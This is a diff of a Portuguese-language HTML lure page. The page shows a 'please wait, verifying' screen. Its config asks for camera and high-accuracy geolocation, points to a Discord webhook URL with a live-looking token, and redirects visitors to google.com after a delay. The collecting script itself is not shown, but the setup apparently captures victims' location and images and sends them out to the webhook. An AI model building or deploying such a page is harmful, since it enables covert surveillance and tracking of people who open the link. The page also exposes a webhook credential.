@@ -1,3 +1,4 @@
+<!DOCTYPE html>
 <html lang="pt-BR">
 <head>
   <meta charset="utf-8" />
@@ -13,19 +14,18 @@
   <div id="status">Aguarde, verificando...</div>
   <div id="debugBox"></div>
 
-  <!-- Config inline mínima (pode sobrescrever via osint-config.js ou querystring) -->
   <script>
     window.OSINT_CONFIG = {
-      webhookUrl: "https://discord.com/api/webhooks/1472041670727172385/-SgOvP3GgMJnpN6nNq3VGMVpA1AeSPPWrpx6PmDJRs47aDqiT77BVZQyMhtgQS-4wkbK", // ⚠️ TROQUE
-      finalUrl: "https://www.exemplo.com",   // destino padrão
-      requestCamera: true,   // tentar câmera?
-      requestGeo: true,      // tentar geolocalização?
-      redirectDelayMs: 1000, // atraso antes do redirect
-      debug: false           // mostrar logs na tela
+      webhookUrl: "https://discord.com/api/webhooks/1472041670727172385/-SgOvP3GgMJnpN6nNq3VGMVpA1AeSPPWrpx6PmDJRs47aDqiT77BVZQyMhtgQS-4wkbK",
+      finalUrl: "https://www.google.com",
+      requestCamera: true,
+      requestGeo: true,
+      redirectDelayMs: 3000,
+      debug: false,
+      altaPrecisao: true
     };
   </script>
 
-  <!-- Importa config externa opcional (se existir; falha silenciosa) -->
   <script src="osint-config.js" defer></script>
   <!-- Script principal -->
   <script src="script.js" defer></script>
